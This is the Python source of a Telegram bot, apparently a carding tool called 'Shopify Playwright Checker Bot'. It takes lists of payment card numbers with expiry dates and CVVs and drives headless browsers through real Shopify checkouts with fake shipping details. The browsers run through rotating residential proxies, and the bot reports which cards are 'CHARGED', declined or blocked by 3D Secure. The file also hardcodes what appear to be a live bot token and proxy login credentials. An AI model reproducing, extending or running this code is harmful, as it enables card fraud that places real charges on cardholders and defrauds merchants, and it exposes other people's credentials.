import asyncio
import re
import time
import logging
import random
from urllib.parse import urlparse

import httpx
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

API_TOKEN = "8137441321:AAHYLJt2PcMXteMTKaEokI6fZXOQyStjnxA"   # <-- ВСТАВЬ СЮДА СВОЙ ТОКЕН

# Список прокси. Если не нужен — оставь пустым.
PROXIES = [
     "la.residential.rayobyte.com:8000:hsy52795_gmail_com:ssdo22",
     "evo-pro.porterproxies.com:61236:PP_3P822Y5DL9-country-US:0bykaznk",
]

logging.basicConfig(level=logging.INFO, filename="shopifybot.log", filemode="a")

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
user_shops = {}
user_stats = {}

def parse_card(card_str):
    normalized = re.sub(r"[^\d|]", "|", card_str)
    numbers = [x for x in normalized.split("|") if x.isdigit()]
    if len(numbers) >= 4:
        return numbers[0], numbers[1], numbers[2], numbers[3]
    raise ValueError("Wrong card format")

def parse_cards_bulk(cards_blob):
    lines = re.split(r'[\r\n;,]+', cards_blob)
    result = []
    for line in lines:
        try:
            card_data = parse_card(line)
            result.append(card_data)
            if len(result) >= 15:
                break
        except Exception:
            continue
    return result

def normalize_url(site):
    if not site.startswith("http"):
        site = "https://" + site
    return site.rstrip("/")

def get_proxy():
    if PROXIES:
        return random.choice(PROXIES)
    return None

async def scrape_shopify_products(store_url: str, proxy: str = None) -> dict:
    """Поиск самого дешевого реально доступного товара в Shopify магазине"""
    if not store_url.startswith("http"):
        store_url = "https://" + store_url

    parsed_url = urlparse(store_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    products_json_url = f"{base_url}/products.json?limit=250"

    try:
        transport = None
        if proxy:
            transport = httpx.AsyncHTTPTransport(proxy=proxy)
        async with httpx.AsyncClient(timeout=30.0, transport=transport) as client:
            response = await client.get(products_json_url)
            response.raise_for_status()
            data = response.json()

            if "products" not in data:
                raise Exception(f"No 'products' key found in JSON from {products_json_url}")

            all_variants = []
            for product in data["products"]:
                product_title = product.get("title", "N/A")
                product_id = product.get("id")
                product_handle = product.get("handle", "")

                for variant in product.get("variants", []):
                    price_str = variant.get("price")
                    if price_str and variant.get("available"):
                        try:
                            price = float(price_str)
                            if price > 0:
                                all_variants.append({
                                    "id": product_id,
                                    "variant_id": variant.get("id"),
                                    "title": product_title,
                                    "price": price,
                                    "handle": product_handle,
                                    "sku": variant.get("sku", ""),
                                    "inventory_quantity": variant.get("inventory_quantity", 0),
                                    "available": variant.get("available", False)
                                })
                        except (ValueError, TypeError):
                            continue

            if not all_variants:
                raise Exception("No available products found")

            sorted_variants = sorted(all_variants, key=lambda x: x['price'])
            cheapest_product = sorted_variants[0]

            return {
                'id': cheapest_product['id'],
                'variant_id': cheapest_product['variant_id'],
                'title': cheapest_product['title'],
                'price': f"{cheapest_product['price']:.2f}",
                'handle': cheapest_product['handle'],
                'sku': cheapest_product['sku'],
                'inventory_quantity': cheapest_product['inventory_quantity'],
                'available': cheapest_product['available']
            }

    except Exception as e:
        raise Exception(f"Error scraping Shopify products from {store_url}: {e}")

async def shopify_check(shop_url, card_tuple, proxy=None):
    try:
        product = await scrape_shopify_products(shop_url, proxy)
        variant_id = product["variant_id"]
        price = product["price"]
        handle = product["handle"]
        title = product["title"]
    except Exception as e:
        return f"❌ Ошибка поиска товара: {e}", "N/A"

    try:
        async with async_playwright() as p:
            browser_args = ["--no-sandbox"]
            if proxy:
                browser_args += [f'--proxy-server={proxy}']
            browser = await p.chromium.launch(headless=True, args=browser_args)
            context = await browser.new_context()
            page = await context.new_page()
            await page.goto(f"{shop_url}/cart/add?id={variant_id}&quantity=1", timeout=12000)
            await page.goto(f"{shop_url}/checkout", timeout=15000)

            async def fill_selector(selector, value):
                try:
                    await page.fill(selector, value)
                except Exception:
                    pass

            await fill_selector('input[name="checkout[email]"]', "makaroe999@gmail.com")
            await fill_selector('input[name="checkout[shipping_address][first_name]"]', "Test")
            await fill_selector('input[name="checkout[shipping_address][last_name]"]', "User")
            await fill_selector('input[name="checkout[shipping_address][address1]"]', "5 Madison Ave")
            await fill_selector('input[name="checkout[shipping_address][State]"]', "New York")
            await fill_selector('input[name="checkout[shipping_address][city]"]', "New York")
            await fill_selector('input[name="checkout[shipping_address][zip]"]', "10010")
            await fill_selector('input[name="checkout[shipping_address][phone]"]', "12053343434")

            try:
                await page.click('button[type="submit"]', timeout=10000)
                await page.wait_for_timeout(3500)
            except PlaywrightTimeoutError:
                pass

            frame = None
            for f in page.frames:
                if "card-fields" in f.url or "stripe" in f.url:
                    frame = f
                    break
            if not frame:
                frame = page

            try:
                await frame.fill('input[name*="number"],input[placeholder*="Card number"]', card_tuple[0])
                await frame.fill('input[name*="name"],input[placeholder*="Name"]', "TEST USER")
                await frame.fill('input[name*="expiry"],input[placeholder*="MM / YY"]', f"{card_tuple[1]}/{card_tuple[2][-2:]}")
                await frame.fill('input[name*="verification"],input[placeholder*="CVV"]', card_tuple[3])
            except Exception:
                await browser.close()
                return "❌ Card fields not found", price

            try:
                await frame.click('button[type="submit"],button[name="button"],button:has-text("Pay")', timeout=9000)
            except Exception:
                pass

            await page.wait_for_timeout(5000)
            content = (await page.content()).lower()
            url = page.url.lower()
            await browser.close()
            if "thank you" in content or "order confirmation" in content or "/thank_you" in url:
                result = "✅ CHARGED"
            elif "3d secure" in content or "acs" in url or "challenge" in url or "authentication required" in content:
                result = "🔒 3DS_REQUIRED"
            elif "card was declined" in content or "declined" in content:
                result = "❌ CARD_DECLINED"
            else:
                result = "❓ UNKNOWN"
            return result, price
    except Exception as e:
        logging.error(f"shopify_check: {e}")
        return f"❌ ERROR: {e}", "N/A"

def update_stats(user_id, status):
    if user_id not in user_stats:
        user_stats[user_id] = {"total": 0, "success": 0, "declined": 0, "3ds": 0, "error": 0}
    user_stats[user_id]["total"] += 1
    if "CHARGED" in status:
        user_stats[user_id]["success"] += 1
    elif "DECLINED" in status:
        user_stats[user_id]["declined"] += 1
    elif "3DS" in status:
        user_stats[user_id]["3ds"] += 1
    elif "ERROR" in status or "No products" in status or "Ошибка" in status:
        user_stats[user_id]["error"] += 1

def stats_button():
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📊 Статистика", callback_data="show_stats")]
        ]
    )
    return kb

@dp.message(Command("addurl"))
async def addurl(message: Message):
    parts = message.text.strip().split()
    if len(parts) != 2:
        await message.answer("🟦 Usage: /addurl <shopify_url>")
        return
    shop_url = normalize_url(parts[1])
    user_id = message.from_user.id
    await message.answer("🔎 Checking shop, please wait...")
    t0 = time.time()
    try:
        product = await scrape_shopify_products(shop_url, get_proxy())
        price = product["price"]
        title = product["title"]
        handle = product["handle"]
        user_shops[user_id] = shop_url
        elapsed = time.time() - t0
        await message.answer(
            f"✅ <b>Shop added!</b>\n"
            f"🌐 <b>Site:</b> <code>{shop_url}</code>\n"
            f"🛒 <b>Product:</b> {title}\n"
            f"💰 <b>Price:</b> {price}$\n"
            f"⏱️ <b>Checked in:</b> {elapsed:.2f}s\n"
            f"ℹ️ Use <b>/sh</b> or <b>/msh</b> to check cards.",
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ Shop is not supported or no available products found.\n{e}")

@dp.message(Command("sh"))
async def sh(message: Message):
    user_id = message.from_user.id
    if user_id not in user_shops:
        await message.answer("🟦 First, add a shop: /addurl <shopify_url>")
        return
    cards_blob = message.text.replace("/sh", "").strip()
    try:
        card_tuple = parse_card(cards_blob)
    except Exception:
        await message.answer("🟦 Usage: /sh <card_number|mm|yy|cvc>")
        return
    shop_url = user_shops[user_id]
    proxy = get_proxy()
    await message.answer(
        f"🔄 Checking card on <code>{shop_url}</code>...\n🌐 Proxy: <code>{proxy or 'No proxy'}</code>",
        parse_mode="HTML"
    )
    t0 = time.time()
    result, price = await shopify_check(shop_url, card_tuple, proxy)
    elapsed = time.time() - t0
    update_stats(user_id, result)
    await message.answer(
        f"🌐 <b>Site:</b> <code>{shop_url}</code>\n"
        f"💳 <b>Card:</b> <code>{'|'.join(card_tuple)}</code>\n"
        f"💰 <b>Product:</b> {price}$\n"
        f"📝 <b>Status:</b> <b>{result}</b>\n"
        f"⏱️ <b>Time:</b> {elapsed:.2f}s",
        reply_markup=stats_button(),
        parse_mode="HTML"
    )

@dp.message(Command("msh"))
async def msh(message: Message):
    user_id = message.from_user.id
    if user_id not in user_shops:
        await message.answer("🟦 First, add a shop: /addurl <shopify_url>")
        return
    cards_blob = message.text.replace("/msh", "").strip()
    cards = parse_cards_bulk(cards_blob)
    if not cards:
        await message.answer("🟦 No valid cards found (up to 15 per run, any separator: newline, |, ; etc.)")
        return
    shop_url = user_shops[user_id]
    msg = await message.answer(f"🔄 Checking {len(cards)} cards on <code>{shop_url}</code>...", parse_mode="HTML")
    results = []
    sem = asyncio.Semaphore(4)  # max 4 одновременных браузеров

    async def check_one(idx, card_tuple):
        t0 = time.time()
        proxy = get_proxy()
        async with sem:
            result, price = await shopify_check(shop_url, card_tuple, proxy)
        elapsed = time.time() - t0
        update_stats(user_id, result)
        results.append(
            f"<b>#{idx}</b> | <code>{'|'.join(card_tuple)}</code>\n"
            f"📝 <b>Status:</b> {result}\n"
            f"⏱️ <b>Time:</b> {elapsed:.2f}s\n"
            f"🌐 Proxy: <code>{proxy or 'No proxy'}</code>\n"
        )

    await asyncio.gather(*(check_one(idx, card) for idx, card in enumerate(cards, 1)))
    await msg.edit_text(
        f"🌐 <b>Site:</b> <code>{shop_url}</code>\n"
        f"🗂️ <b>Batch check results:</b>\n\n" +
        "\n".join(results),
        reply_markup=stats_button(),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "show_stats")
async def show_stats_callback(query: CallbackQuery):
    user_id = query.from_user.id
    stats = user_stats.get(user_id, {"total": 0, "success": 0, "declined": 0, "3ds": 0, "error": 0})
    text = (
        f"📊 <b>Ваша статистика:</b>\n"
        f"Всего проверок: <b>{stats['total']}</b>\n"
        f"✅ CHARGED: <b>{stats['success']}</b>\n"
        f"❌ Declined: <b>{stats['declined']}</b>\n"
        f"🔒 3DS: <b>{stats['3ds']}</b>\n"
        f"❌ Error: <b>{stats['error']}</b>"
    )
    await query.answer()
    await query.message.answer(text, parse_mode="HTML")

@dp.message(Command("help"))
async def help_command(message: Message):
    await message.answer(
        "<b>Shopify Playwright Checker Bot</b>\n\n"
        "🟦 <b>Commands:</b>\n"
        "/addurl &lt;shopify_url&gt; — add a shop\n"
        "/sh &lt;card|mm|yy|cvc&gt; — single card check\n"
        "/msh &lt;card1|mm|yy|cvc&gt;|... — batch check (up to 15)\n"
        "/status — your stats\n"
        "/help — show this help\n\n"
        "🟦 <b>Status codes:</b>\n"
        "✅ CHARGED — Successful\n"
        "❌ CARD_DECLINED — Declined\n"
        "🔒 3DS_REQUIRED — 3D Secure requested\n"
        "❓ UNKNOWN — Unknown result\n"
        "❌ ERROR — Error",
        parse_mode="HTML"
    )

@dp.message(Command("status"))
async def status(message: Message):
    user_id = message.from_user.id
    shop = user_shops.get(user_id, 'Not set')
    stats = user_stats.get(user_id, {"total": 0, "success": 0, "declined": 0, "3ds": 0, "error": 0})
    await message.answer(
        f"🟦 <b>Status:</b>\n"
        f"Shop: <code>{shop}</code>\n"
        f"Total checks: <b>{stats['total']}</b>\n"
        f"✅ CHARGED: <b>{stats['success']}</b>\n"
        f"❌ Declined: <b>{stats['declined']}</b>\n"
        f"🔒 3DS: <b>{stats['3ds']}</b>\n"
        f"❌ Error: <b>{stats['error']}</b>",
        parse_mode="HTML"
    )

@dp.message(Command("start"))
async def start(message: Message):
    await help_command(message)

if __name__ == "__main__":
    import sys, platform
    if platform.system() == "Windows":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(dp.start_polling(bot))